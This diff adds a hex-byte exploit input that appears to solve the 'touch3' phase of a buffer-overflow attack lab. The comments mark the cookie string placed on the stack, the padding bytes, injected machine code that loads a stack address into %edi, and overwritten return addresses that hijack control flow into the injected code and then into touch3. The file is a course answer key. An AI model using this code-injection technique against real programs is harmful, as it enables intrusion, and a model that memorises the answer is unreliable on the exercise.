@@ -1,0 +1,10 @@
+35 39 62 39 39 37 66 61 00 39   /* 59b997fa'\0' padding <- here is 0x5561dc78 */
+30 31 32 33 34 35 36 37 38 39 
+30 31 32 33 34 35 36 37 38 39 
+30 31 32 33 
+bf 78 dc 61 55      	        /* mov    $0x5561dc78,%edi  */
+c3                   	        /* retq                     */
+9a dc 61 55 00 00 00 00         /* return addr shellcode: 0x5561dca0 <- return ip (first) */
+fa 18 40 00 00 00 00 00 0a      /* return addr touch3 */
+
+
